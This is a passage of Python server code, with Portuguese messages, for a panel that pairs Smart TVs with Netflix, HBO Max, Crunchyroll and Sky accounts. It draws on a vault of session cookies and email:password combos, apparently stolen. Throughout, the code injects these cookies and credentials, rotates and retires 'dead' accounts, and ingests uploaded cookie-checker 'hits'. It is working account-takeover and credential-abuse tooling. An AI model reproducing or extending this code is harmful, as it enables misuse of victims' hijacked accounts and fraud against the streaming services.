            for e in all_netflix[:30] if isinstance(e, dict) and os.path.basename(e.get("file", "")) != active_nf_bname
        ]

        active_hbo_file = CURRENT_HBO_READY.get("file", "") if CURRENT_HBO_READY else ""
        active_hbo_bname = os.path.basename(active_hbo_file) if active_hbo_file else ""

        hbo_queue = [
            {
                "filename": os.path.basename(e.get("file", "")),
                "email": e.get("info", {}).get("email", "HBO Max VIP"),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "HBO Max VIP"),
                "is_selected": (os.path.basename(e.get("file", "")) == active_hbo_bname),
                "is_verified": e.get("validated", False)
            }
            for e in all_hbo[:30] if isinstance(e, dict) and os.path.basename(e.get("file", "")) != active_hbo_bname
        ]

        active_cr_email = CURRENT_CRUNCHYROLL_READY.get("email", "") if CURRENT_CRUNCHYROLL_READY else ""

        cr_queue = [
            {
                "filename": e.get("email") or e.get("file", "combo"),
                "email": e.get("info", {}).get("email", e.get("email", "Crunchyroll VIP")),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "Crunchyroll VIP"),
                "is_selected": (e.get("email") == active_cr_email),
                "is_verified": e.get("validated", False)
            }
            for e in all_cr[:30] if isinstance(e, dict) and e.get("email") != active_cr_email
        ]

        active_sky_email = CURRENT_SKY_READY.get("email", "") if CURRENT_SKY_READY else ""

        sky_queue = [
            {
                "filename": e.get("email") or e.get("file", "skycontas.txt"),
                "email": e.get("info", {}).get("email", e.get("email", "Sky TV VIP")),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "Sky TV VIP"),
                "client_name": e.get("info", {}).get("client_name", ""),
                "is_selected": (e.get("email") == active_sky_email),
                "is_verified": e.get("validated", False)
            }
            for e in all_sky[:30] if isinstance(e, dict) and e.get("email") != active_sky_email
        ]

        nf_count = len(all_netflix)
        hbo_count = len(all_hbo)
        cr_count = len(all_cr)
        sky_count = len(all_sky)

        res = {
            "netflix": {
                "total_in_vault": nf_count,
                "available_count": nf_count,
                "has_account": CURRENT_NETFLIX_READY is not None,
                "account": CURRENT_NETFLIX_READY.get("info") if CURRENT_NETFLIX_READY else None,
                "cookie_name": os.path.basename(CURRENT_NETFLIX_READY.get("file", "")) if (CURRENT_NETFLIX_READY and CURRENT_NETFLIX_READY.get("file")) else (CURRENT_NETFLIX_READY.get("email") if CURRENT_NETFLIX_READY else None),
                "cookie_queue": nf_queue
            },
            "hbo": {
                "total_in_vault": hbo_count,
                "available_count": hbo_count,
                "has_account": CURRENT_HBO_READY is not None,
                "account": CURRENT_HBO_READY.get("info") if CURRENT_HBO_READY else None,
                "cookie_name": os.path.basename(CURRENT_HBO_READY.get("file", "")) if (CURRENT_HBO_READY and CURRENT_HBO_READY.get("file")) else (CURRENT_HBO_READY.get("email") if CURRENT_HBO_READY else None),
                "cookie_queue": hbo_queue
            },
            "crunchyroll": {
                "total_in_vault": cr_count,
                "available_count": cr_count,
                "has_account": CURRENT_CRUNCHYROLL_READY is not None,
                "account": CURRENT_CRUNCHYROLL_READY.get("info") if CURRENT_CRUNCHYROLL_READY else None,
                "cookie_name": CURRENT_CRUNCHYROLL_READY.get("email") if CURRENT_CRUNCHYROLL_READY else None,
                "cookie_queue": cr_queue
            },
            "sky": {
                "total_in_vault": sky_count,
                "available_count": sky_count,
                "has_account": CURRENT_SKY_READY is not None,
                "account": CURRENT_SKY_READY.get("info") if CURRENT_SKY_READY else None,
                "cookie_name": CURRENT_SKY_READY.get("email") if CURRENT_SKY_READY else None,
                "cookie_queue": sky_queue
            },
            "local_ip": get_local_ip(),
            "port": PORT
        }

        session = self.get_session_info()
        auth_token = self.get_auth_token_str()
        ua = self.headers.get('User-Agent', '')
        client_ip = self.get_client_ip()
        role_name = session.get("role_name", "Acesso VIP") if session else "Acesso VIP"
        
        # Registra heartbeat em tempo real
        track_client_heartbeat(client_ip, auth_token, ua, role_name, "")

        res["allowed_services"] = session.get("services", ["netflix", "hbo", "crunchyroll", "sky"]) if session else ["netflix", "hbo", "crunchyroll", "sky"]
        res["role_name"] = role_name
        res["server_version"] = SERVER_DATA_VERSION
        res["online_users"] = get_online_users_data()

        self.send_json_response(res)

    def handle_api_skip_cookie(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        service = req.get('service', 'netflix')

        if not self.is_service_allowed(service):
            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)

        now_ts = time.time()
        if service == 'netflix':
            cur_file = ""
            cur_email = ""
            if CURRENT_NETFLIX_READY:
                cur_file = CURRENT_NETFLIX_READY.get("file", "")
                cur_email = CURRENT_NETFLIX_READY.get("info", {}).get("email", "")
                if cur_file:
                    tv2.mark_cookie_used(cur_file, cur_email)
            CURRENT_NETFLIX_READY = find_netflix_fast_cookie(exclude_file=cur_file, exclude_email=cur_email)
        elif service == 'crunchyroll':
            if CURRENT_CRUNCHYROLL_READY and CURRENT_CRUNCHYROLL_READY.get("email"):
                CR_LAST_USED_AT[CURRENT_CRUNCHYROLL_READY["email"]] = now_ts
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        elif service == 'sky':
            if CURRENT_SKY_READY:
                em = CURRENT_SKY_READY.get("email", "").strip().lower()
                if em:
                    sky_service.record_sky_account_used(em)
                    USED_SKY_ACCOUNTS.add(em)
                    SKY_LAST_USED_AT[em] = now_ts
            sky_service.load_all_sky_accounts(force_reload=True)
            CURRENT_SKY_READY = find_sky_valid_account()
        else:
            if CURRENT_HBO_READY and CURRENT_HBO_READY.get("file"):
                f = CURRENT_HBO_READY["file"]
                HBO_LAST_USED_AT[f] = now_ts
                HBO_LAST_USED_AT[os.path.basename(f)] = now_ts
            CURRENT_HBO_READY = find_hbo_valid_cookie()

        self.handle_api_status()

    def handle_api_activate(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                req = json.loads(post_data.decode('utf-8'))
            except Exception:
                return self.send_json_response({"success": False, "message": "JSON inválido na requisição."}, 400)

            service = req.get('service', 'netflix')

            # 🔒 Bloqueio rigoroso se a senha não tiver acesso a este streaming
            if not self.is_service_allowed(service):
                s_name = "Crunchyroll" if service == 'crunchyroll' else ("HBO Max" if service == 'hbo' else ("Sky+" if service == 'sky' else "Netflix"))
                return self.send_json_response({
                    "success": False,
                    "message": f"🔒 VOCÊ NÃO TEM ACESSO A ESSE CONTEÚDO! ({s_name} bloqueado pela sua senha)."
                }, 403)

            tv_code = req.get('code', '').strip()

            if not tv_code:
                return self.send_json_response({"success": False, "message": "Por favor, digite o código exibido na TV."}, 400)

            clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()

            if service == 'netflix':
                kernel_logger.push_kernel_log(f"🍿 [Netflix] Iniciando pareamento de TV com código {clean_code}...")
                
                # Seleção forçada de cookie apenas se explicitamente solicitada (ex: depuração ou escolha pontual)
                req_cookie = req.get('force_cookie') or req.get('cookie_choice')
                specific_account = None
                if req_cookie and isinstance(req_cookie, str) and req_cookie.strip() and not req_cookie.strip().startswith('COOKIE:'):
                    specific_account = select_netflix_cookie_by_filename(req_cookie.strip())

                used_account = specific_account or CURRENT_NETFLIX_READY or find_netflix_valid_cookie()
                if not used_account:
                    all_nf = get_all_netflix_accounts()
                    if all_nf:
                        used_account = random.choice(all_nf)

                if not used_account:
                    kernel_logger.push_kernel_log("❌ [Netflix] Nenhum cookie válido disponível no cofre.", level="error")
                    return self.send_json_response({
                        "success": False,
                        "message": "Nenhum cookie Netflix válido disponível no momento."
                    }, 404)

                CURRENT_NETFLIX_READY = used_account
                used_file = used_account.get("file", "")
                account_info = used_account.get("info", {})
                kernel_logger.push_kernel_log(f"🍪 [Netflix] Injetando cookie: {account_info.get('email', os.path.basename(used_file))}...")
                success, msg, info = activate_netflix_tv(clean_code, used_account)
                account_info = info or used_account.get("info", {})

                if success:
                    tv2.mark_cookie_used(used_file, account_info.get("email", ""))
                    record_history_entry("Netflix", used_file, account_info.get("email", ""), clean_code, account_info.get("plan", "Netflix"), "Sucesso")
                    # Atualiza a próxima conta em segundo plano sem travar a resposta do usuário
                    def _async_load_next(ex_f, ex_em):
                        global CURRENT_NETFLIX_READY
                        try:
                            CURRENT_NETFLIX_READY = find_netflix_fast_cookie(exclude_file=ex_f, exclude_email=ex_em)
                        except Exception:
                            pass
                    threading.Thread(target=_async_load_next, args=(used_file, account_info.get("email", "")), daemon=True).start()

                    kernel_logger.push_kernel_log(f"⚡ [Netflix] [SUCESSO] TV {clean_code} vinculada com sucesso!", level="success")
                    return self.send_json_response({
                        "success": True,
                        "message": msg or "TV pareada e ativada com sucesso!",
                        "account": account_info
                    })
                else:
                    kernel_logger.push_kernel_log(f"⚠️ [Netflix] Tentativa inicial falhou: {msg}", level="warn")
                    # Se for código de TV inválido ou expirado, encerra IMEDIATAMENTE sem queimar o cookie
                    if any(k in msg.lower() for k in ["código", "codigo", "expirou", "inválido", "invalido", "recusado", "já utilizado"]):
                        return self.send_json_response({
                            "success": False,
                            "message": msg
                        })

                    # Se falhou por motivo de sessão do cookie, tenta no máximo 1 conta alternativa
                    DEAD_NETFLIX_COOKIES.add(used_file)
                    DEAD_NETFLIX_COOKIES.add(os.path.basename(used_file))
                    tv2.DEAD_COOKIES.add(used_file)
                    tv2.DEAD_COOKIES.add(os.path.basename(used_file))
                    alt_account = find_netflix_fast_cookie(exclude_file=used_file, exclude_email=account_info.get("email", ""))
                    if alt_account:
                        CURRENT_NETFLIX_READY = alt_account
                        alt_file = alt_account.get("file", "")
                        alt_info = alt_account.get("info", {})
                        kernel_logger.push_kernel_log(f"🍪 [Netflix] Tentando cookie alternativo: {alt_info.get('email', os.path.basename(alt_file))}...")
                        succ2, msg2, info2 = activate_netflix_tv(clean_code, alt_account)
                        if succ2:
                            tv2.mark_cookie_used(alt_file, alt_info.get("email", ""))
                            record_history_entry("Netflix", alt_file, alt_info.get("email", ""), clean_code, account_info.get("plan", "Netflix"), "Sucesso")
                            def _async_load_next2(ex_f, ex_em):
                                global CURRENT_NETFLIX_READY
                                try:
                                    CURRENT_NETFLIX_READY = find_netflix_fast_cookie(exclude_file=ex_f, exclude_email=ex_em)
                                except Exception:
                                    pass
                            threading.Thread(target=_async_load_next2, args=(alt_file, alt_info.get("email", "")), daemon=True).start()

                            return self.send_json_response({
                                "success": True,
                                "message": msg2 or "TV pareada e ativada com sucesso!",
                                "account": info2 or alt_info
                            })
                        else:
                            msg = msg2

                    return self.send_json_response({
                        "success": False,
                        "message": msg or "Falha ao parear com a TV. Verifique o código digitado."
                    })

            elif service == 'hbo':
                kernel_logger.push_kernel_log(f"🟣 [HBO Max] Iniciando pareamento de TV com código {clean_code}...")
                if CURRENT_HBO_READY is None:
                    CURRENT_HBO_READY = find_hbo_valid_cookie()

                if not CURRENT_HBO_READY:
                    all_hbo = get_all_hbo_accounts()
                    if all_hbo:
                        CURRENT_HBO_READY = all_hbo[0]

                if not CURRENT_HBO_READY:
                    kernel_logger.push_kernel_log("❌ [HBO Max] Nenhum cookie ativo disponível.", level="error")
                    return self.send_json_response({
                        "success": False,
                        "message": "Nenhum cookie HBO Max ativo encontrado nas pastas."
                    }, 404)

                used_file = CURRENT_HBO_READY["file"]
                account_info = CURRENT_HBO_READY.get("info", {})
                kernel_logger.push_kernel_log(f"🍪 [HBO Max] Injetando credenciais: {account_info.get('email', os.path.basename(used_file))}...")
                success, msg, info = activate_hbo_tv(clean_code, CURRENT_HBO_READY)
                account_info = info or CURRENT_HBO_READY.get("info", {})

                if success:
                    now_ts = time.time()
                    HBO_LAST_USED_AT[used_file] = now_ts
                    HBO_LAST_USED_AT[os.path.basename(used_file)] = now_ts
                    record_history_entry("HBO Max", used_file, account_info.get("email", ""), clean_code, account_info.get("plan", "HBO Max VIP"), "Sucesso")
                    CURRENT_HBO_READY = find_hbo_valid_cookie()
                    kernel_logger.push_kernel_log(f"⚡ [HBO Max] [SUCESSO] TV {clean_code} vinculada com sucesso!", level="success")
                    return self.send_json_response({
                        "success": True,
                        "message": msg,
                        "account": account_info
                    })
                else:
                    kernel_logger.push_kernel_log(f"⚠️ [HBO Max] Falha: {msg}", level="warn")
                    DEAD_HBO_COOKIES.add(used_file)
                    DEAD_HBO_COOKIES.add(os.path.basename(used_file))
                    CURRENT_HBO_READY = find_hbo_valid_cookie()
                    return self.send_json_response({
                        "success": False,
                        "message": msg or "Falha ao parear com a TV HBO Max. Verifique o código de 6 dígitos."
                    })

            elif service == 'crunchyroll':
                kernel_logger.push_kernel_log(f"🟠 [Crunchyroll] Iniciando pareamento de TV com código {clean_code}...")
                if CURRENT_CRUNCHYROLL_READY is None:
                    CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()

                if not CURRENT_CRUNCHYROLL_READY:
                    kernel_logger.push_kernel_log("❌ [Crunchyroll] Nenhuma conta premium pronta no combo.", level="error")
                    return self.send_json_response({
                        "success": False,
                        "message": "Nenhuma conta Crunchyroll premium encontrada nos combos."
                    }, 404)

                used_account = CURRENT_CRUNCHYROLL_READY
                kernel_logger.push_kernel_log(f"🔑 [Crunchyroll] Autenticando com {used_account.get('email')}...")
                success, msg, info = activate_crunchyroll_tv(clean_code, used_account)
                account_info = info or used_account.get("info", {})

                if success:
                    now_ts = time.time()
                    CR_LAST_USED_AT[used_account["email"]] = now_ts
                    record_history_entry("Crunchyroll", used_account.get("file", "combo.txt"), account_info.get("email", ""), clean_code, account_info.get("plan", "Crunchyroll VIP"), "Sucesso")
                    CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
                    kernel_logger.push_kernel_log(f"⚡ [Crunchyroll] [SUCESSO] TV {clean_code} ativada com sucesso!", level="success")
                    return self.send_json_response({
                        "success": True,
                        "message": msg,
                        "account": account_info
                    })
                else:
                    kernel_logger.push_kernel_log(f"⚠️ [Crunchyroll] Falha: {msg}", level="warn")
                    if "sessão" in msg.lower() or "token" in msg.lower() or "wrong_creds" in msg.lower():
                        DEAD_CRUNCHYROLL_ACCOUNTS.add(used_account["email"])
                        CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
                    return self.send_json_response({
                        "success": False,
                        "message": msg
                    })

            elif service == 'sky':
                kernel_logger.push_kernel_log(f"📡 [Sky+] Transmissão iniciada para TV {clean_code}...")

                # 🎯 Se o frontend solicitou uma conta específica selecionada
                req_account_id = req.get('account') or req.get('email') or req.get('cookie_name')
                chosen_acc = None
                if req_account_id and isinstance(req_account_id, str) and req_account_id.strip():
                    specific_acc = select_sky_account_by_identifier(req_account_id.strip())
                    if specific_acc:
                        chosen_acc = specific_acc

                # Rotação Circular Justa: pega a próxima conta da fila (menos recentemente usada)
                if not chosen_acc:
                    chosen_acc = find_sky_valid_account()

                if chosen_acc:
                    CURRENT_SKY_READY = chosen_acc

                last_msg = ""
                for _attempt in range(2):
                    curr_sky_em = CURRENT_SKY_READY.get("email", "").strip().lower() if CURRENT_SKY_READY else ""
                    if CURRENT_SKY_READY is None or (curr_sky_em and curr_sky_em in DEAD_SKY_ACCOUNTS):
                        CURRENT_SKY_READY = find_sky_valid_account()

                    if not CURRENT_SKY_READY:
                        kernel_logger.push_kernel_log("❌ [Sky+] Nenhuma conta Sky pronta no estoque.", level="error")
                        break

                    used_account = CURRENT_SKY_READY
                    acc_email = used_account.get("email", "").strip()
                    acc_email_clean = acc_email.lower()
                    kernel_logger.push_kernel_log(f"🔑 [Sky+] Conta da fila: {acc_email} (Tentativa {_attempt+1}/2)...")
                    success, msg, info = activate_sky_tv(clean_code, used_account)
                    account_info = info or used_account.get("info", {})
                    last_msg = msg

                    if success:
                        kernel_logger.push_kernel_log(f"⚡ [Sky+] [SUCESSO] TV {clean_code} ativada com sucesso!", level="success")
                        now_ts = time.time()
                        SKY_LAST_USED_AT[acc_email_clean] = now_ts
                        USED_SKY_ACCOUNTS.add(acc_email_clean)
                        record_history_entry("Sky", used_account.get("file", "skycontas.txt"), account_info.get("email", ""), clean_code, account_info.get("plan", "Sky TV VIP"), "Sucesso")
                        sky_service.record_account_activated(used_account.get("email", ""), used_account.get("password", ""), clean_code)
                        sky_service.record_sky_account_used(acc_email_clean)
                        sky_service.load_all_sky_accounts(force_reload=True)
                        CURRENT_SKY_READY = find_sky_valid_account()
                        return self.send_json_response({
                            "success": True,
                            "message": msg,
                            "account": account_info
                        })
                    else:
                        kernel_logger.push_kernel_log(f"⚠️ [Sky+] Tentativa {_attempt+1} falhou: {msg}", level="warn")
                        sky_service.record_sky_account_used(acc_email_clean)
                        # Se for código de TV inexistente ou expirado na Smart TV, interrompe imediatamente
                        if any(k in msg.lower() for k in ["404", "não encontrado", "expirad", "user_code_expired", "dtv-oidc", "invalid_request"]):
                            CURRENT_SKY_READY = find_sky_valid_account()
                            return self.send_json_response({
                                "success": False,
                                "message": msg
                            })

                        # A conta falhou (ex: sem streaming Sky+, senha inválida etc.)
                        # Marca como indisponível e tenta IMEDIATAMENTE a próxima conta da fila!
                        now_ts = time.time()
                        if acc_email_clean:
                            SKY_LAST_USED_AT[acc_email_clean] = now_ts
                            DEAD_SKY_ACCOUNTS.add(acc_email_clean)
                        sky_service.load_all_sky_accounts(force_reload=True)
                        CURRENT_SKY_READY = find_sky_valid_account()

                kernel_logger.push_kernel_log(f"❌ [Sky+] Falha final na ativação: {last_msg}", level="error")
                return self.send_json_response({
                    "success": False,
                    "message": last_msg or "Falha ao ativar a TV com as contas disponíveis."
                })
            else:
                return self.send_json_response({"success": False, "message": "Serviço desconhecido."}, 400)
        except Exception as e:
            traceback.print_exc()
            kernel_logger.push_kernel_log(f"❌ [API] Falha inesperada em /api/activate: {str(e)}", level="error")
            return self.send_json_response({"success": False, "message": f"Erro interno ao processar ativação: {str(e)}"}, 500)

    def handle_api_sky_test_activate(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8'))
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido na requisição."}, 400)

        usuario = str(req.get('login') or req.get('usuario') or req.get('email') or '').strip()
        senha = str(req.get('password') or req.get('senha') or '').strip()
        tv_code = str(req.get('code') or req.get('tv_code') or '').strip().upper()

        if not usuario and not senha and not tv_code:
            return self.send_json_response({"success": False, "message": "Preencha as credenciais e o código da Smart TV."}, 400)

        import testar_sky_api
        kernel_logger.push_kernel_log(f"🧪 [Sky+ API Tester] Iniciando teste e ativação: Conta '{usuario or 'Padrão'}' | TV {tv_code}...")
        success, msg, acc_info = testar_sky_api.executar_ativacao_completa(
            tv_code=tv_code,
            usuario=usuario,
            senha=senha,
            allow_gateway=True
        )

        if success:
            if tv_code and len(tv_code) >= 5:
                sky_service.save_activation_log(usuario or "TESTER", senha or "API", tv_code, True, msg)
                sky_service.record_account_activated(usuario or "TESTER", senha or "API", tv_code)
                record_history_entry("Sky", "testar_sky_api.py", acc_info.get("email", usuario) if acc_info else (usuario or "Sky+"), tv_code, "Sky+ API REST", "Sucesso")
            return self.send_json_response({
                "success": True,
                "message": msg,
                "account": acc_info or {"email": usuario, "plan": "Sky+ Pay-TV HD"}
            })
        else:
            return self.send_json_response({
                "success": False,
                "message": msg
            })

    def handle_api_kernel_logs(self):
        query_params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        since_id = 0
        try:
            since_id = int(query_params.get("since", [0])[0])
        except Exception:
            since_id = 0
        logs, last_id = kernel_logger.get_kernel_logs(since_id)
        return self.send_json_response({"logs": logs, "last_id": last_id})

    def handle_api_cookies(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        query_service = 'netflix'
        if 'service=hbo' in self.path:
            query_service = 'hbo'
        elif 'service=crunchyroll' in self.path:
            query_service = 'crunchyroll'
        elif 'service=sky' in self.path:
            query_service = 'sky'

        if not self.is_service_allowed(query_service):
            return self.send_json_response({
                "service": query_service,
                "total_valid": 0,
                "active_cookie": "",
                "cookies": [],
                "blocked": True,
                "message": "🔒 Você não tem acesso a esse conteúdo."
            })

        if query_service == 'netflix':
            all_accounts = get_all_netflix_accounts()
            active_file = os.path.basename(CURRENT_NETFLIX_READY["file"]) if CURRENT_NETFLIX_READY else ""
            items = []
            for entry in all_accounts:
                bname = os.path.basename(entry["file"])
                acc = entry["info"]
                items.append({
                    "filename": bname,
                    "email": acc.get("email", bname),
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Premium VIP"),
                    "is_selected": (bname == active_file),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
        elif query_service == 'crunchyroll':
            all_accounts = get_all_crunchyroll_accounts()
            active_email = CURRENT_CRUNCHYROLL_READY["email"] if CURRENT_CRUNCHYROLL_READY else ""
            items = []
            for entry in all_accounts:
                email = entry["info"].get("email", entry.get("file", ""))
                acc = entry["info"]
                items.append({
                    "filename": email,
                    "email": email,
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Crunchyroll VIP"),
                    "is_selected": (email == active_email),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
        elif query_service == 'sky':
            try:
                all_accounts = get_all_sky_accounts()
            except Exception:
                all_accounts = []
            active_email = CURRENT_SKY_READY.get("email", "") if CURRENT_SKY_READY else ""
            items = []
            for entry in all_accounts:
                if not isinstance(entry, dict):
                    continue
                acc = entry.get("info", {})
                email = acc.get("email") or entry.get("email") or entry.get("file", "skycontas.txt")
                items.append({
                    "filename": email,
                    "email": email,
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Sky TV VIP"),
                    "client_name": acc.get("client_name", ""),
                    "is_selected": (email == active_email),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
            items = items[:150]
        else:
            all_accounts = get_all_hbo_accounts()
            active_file = os.path.basename(CURRENT_HBO_READY["file"]) if CURRENT_HBO_READY else ""
            items = []
            for entry in all_accounts:
                bname = os.path.basename(entry["file"])
                acc = entry["info"]
                items.append({
                    "filename": bname,
                    "email": acc.get("email", bname),
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "HBO Max VIP"),
                    "is_selected": (bname == active_file),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])

        self.send_json_response({
            "service": query_service,
            "total_valid": len(items),
            "active_cookie": active_email if (query_service in ['crunchyroll', 'sky']) else active_file,
            "cookies": items
        })

    def handle_api_select_cookie(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        service = req.get('service', 'netflix')
        filename = req.get('filename', '').strip()

        if not filename:
            return self.send_json_response({"success": False, "message": "Nome do arquivo ausente."}, 400)

        if not self.is_service_allowed(service):
            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)

        if service == 'netflix':
            selected = select_netflix_cookie_by_filename(filename)
            if selected:
                CURRENT_NETFLIX_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": os.path.basename(selected["file"])
                })
            else:
                return self.send_json_response({"success": False, "message": "Este cookie não está mais ativo na Netflix."}, 404)
        elif service == 'crunchyroll':
            selected = select_crunchyroll_account_by_identifier(filename)
            if selected:
                CURRENT_CRUNCHYROLL_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta Crunchyroll {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": selected.get("email", filename)
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível ativar esta conta Crunchyroll."}, 404)
        elif service == 'sky':
            selected = select_sky_account_by_identifier(filename)
            if selected:
                CURRENT_SKY_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta Sky {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": selected.get("email", filename)
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível selecionar esta conta Sky."}, 404)
        else:
            selected = select_hbo_cookie_by_filename(filename)
            if selected:
                CURRENT_HBO_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta HBO {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": os.path.basename(selected["file"])
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível ativar este cookie HBO Max."}, 404)

    def handle_api_filter_plan(self):
        return self.send_json_response({"success": True, "message": "Plano atualizado."})

    def handle_api_history(self):
        history = load_history()
        self.send_json_response({"history": history})

    def handle_api_upload_cookies(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8'))
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        global_service = req.get('service', 'auto').lower()
        files = req.get('files', [])  # list of {"name": "...", "content": "..."}
        raw_text = req.get('raw_text', '').strip()

        saved_netflix = 0
        saved_hbo = 0
        saved_crunchyroll = 0
        saved_sky = 0

        def detect_service_for_text(text: str, filename: str = "") -> str:
            lower = (text + " " + filename).lower()
            if 'sky' in lower or 'vrio' in lower or 'skymais' in lower or 'assinatura 1:' in lower:
                return 'sky'
            if global_service in ['sky', 'skymais']:
                return 'sky'
            if 'crunchyroll' in lower or 'crunchy' in lower:
                return 'crunchyroll'
            if global_service in ['crunchyroll', 'cr']:
                return 'crunchyroll'
            if ('@' in text and (':' in text or '|' in text)) and ('securentflxid' not in lower and 'max.com' not in lower and 'st=' not in lower and 'netflix' not in lower):
                return 'crunchyroll'
            if 'securentflxid' in lower or 'netflix' in lower:
                return 'netflix'
            elif 'max.com' in lower or 'hbomax' in lower or 'beam' in lower or 'hbo' in lower:
                return 'hbomax'
            if global_service in ['hbo', 'hbomax', 'max']:
                return 'hbomax'
            return 'netflix'

        def save_cookie_content(svc: str, fname: str, content: str, append_mode: bool = False) -> bool:
            nonlocal saved_netflix, saved_hbo, saved_crunchyroll, saved_sky
            if svc == 'sky':
                base_f = os.path.basename(fname).lower()
                if base_f == 'sso_token.txt' or (base_f.endswith('.txt') and 'sso' in base_f and 'ey' in content):
                    sky_service.save_sso_token(content)
                    saved_sky += 1
                    DEAD_SKY_ACCOUNTS.clear()
                    USED_SKY_ACCOUNTS.clear()
                    return True
                elif base_f == 'profile_token.txt' or (base_f.endswith('.txt') and 'profile' in base_f and 'ey' in content):
                    sky_service.save_profile_token(content)
                    saved_sky += 1
                    return True
                elif 'ey' in content and ('"dtvgo"' in content or '"sm-dgo"' in content or '"sky_br"' in content):
                    sky_service.save_sso_token(content)
                    saved_sky += 1
                    DEAD_SKY_ACCOUNTS.clear()
                    USED_SKY_ACCOUNTS.clear()
                    return True

                added = sky_service.save_sky_hits(content)
                saved_sky += added
                DEAD_SKY_ACCOUNTS.clear()
                USED_SKY_ACCOUNTS.clear()
                return True
            elif svc == 'crunchyroll':
                target_dir = CRUNCHYROLL_COMBO_FOLDER
            elif svc in ['hbo', 'hbomax', 'max']:
                target_dir = HBO_COOKIES_FOLDER
            else:
                target_dir = NETFLIX_COOKIES_FOLDER
            os.makedirs(target_dir, exist_ok=True)
            clean_name = re.sub(r'[^a-zA-Z0-9_\-\.\[\]@]', '_', os.path.basename(fname))
            if not clean_name.endswith('.txt') and not clean_name.endswith('.json'):
                clean_name += '.txt'
            fpath = os.path.join(target_dir, clean_name)
            try:
                mode = 'a' if (append_mode and os.path.exists(fpath)) else 'w'
                with open(fpath, mode, encoding='utf-8') as out_f:
                    if mode == 'a':
                        out_f.write('\n' + content.strip() + '\n')
                    else:
                        out_f.write(content)
                if svc == 'crunchyroll':
                    c_lines = [l for l in content.splitlines() if (':' in l or '|' in l) and '@' in l]
                    saved_crunchyroll += max(1, len(c_lines))
                    DEAD_CRUNCHYROLL_ACCOUNTS.clear()
                    USED_CRUNCHYROLL_ACCOUNTS.clear()
                elif svc in ['hbo', 'hbomax', 'max']:
                    saved_hbo += 1
                    USED_HBO_COOKIES.discard(fpath)
                    USED_HBO_COOKIES.discard(clean_name)
                else:
                    saved_netflix += 1
                    DEAD_NETFLIX_COOKIES.discard(fpath)
                    tv2.USED_COOKIES.discard(fpath)
                    tv2.USED_COOKIES.discard(clean_name)
                return True
            except Exception:
                return False

        def split_multiple_raw_cookies(text: str) -> List[str]:
            """Divide de forma inteligente lotes colados de cookies ou combos em itens separados sem corrompê-los."""
            text = text.strip()
            if not text:
                return []

            # 1. Se for lista de combos (Crunchyroll/Sky: email:senha linha a linha)
            lines = [line.strip() for line in text.splitlines() if line.strip()]
            combo_lines = [l for l in lines if re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+[:|][^\s]+', l)]
            if len(combo_lines) >= 1 and len(combo_lines) == len(lines):
                return [text]

            # 2. Se contiver múltiplos blocos do formato padrão de checadores (ex: NETFLIX COOKIE CHECKER — HIT)
            checker_pattern = re.compile(r'(?:^|\r?\n)(?=[=]{10,}\s*\r?\n\s*NETFLIX COOKIE CHECKER)', re.MULTILINE)
